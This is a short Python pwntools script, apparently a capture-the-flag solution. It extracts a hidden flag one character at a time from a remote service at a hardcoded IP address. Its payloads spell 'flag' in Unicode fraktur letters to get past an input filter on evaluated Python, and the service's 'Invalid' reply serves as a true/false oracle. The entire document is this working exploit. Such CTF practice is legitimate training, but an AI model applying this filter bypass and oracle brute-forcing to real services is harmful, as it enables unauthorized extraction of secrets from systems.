import string
from pwn import *

context.log_level = "CRITICAL"

idx = 3
charset = string.printable.replace('}', '')
run = True
flag = ''

while run:
    # test if EOF (End of Flag LOL)
    payload = f'𝔣𝔩𝔞𝔤[{idx}].index("}}")'
    con = remote('159.89.193.103', 9998)
    con.sendline(payload.encode('utf-8'))
    run = b'Invalid' in con.recvall()
    con.close()

    # brute the index
    for c in charset:
        payload = f'𝔣𝔩𝔞𝔤[{idx}].index("{c}")'
        con = remote('159.89.193.103', 9998)
        con.sendline(payload.encode('utf-8'))
        if b'Invalid' not in con.recvall():
            flag += c
            print(f'[{idx:3d}] Got: {c}')
            run = True
            con.close()
            break
        else:
            con.close()
    idx += 1


print(f'yayyyy CJ{{{flag}}} :DDDDDDD')
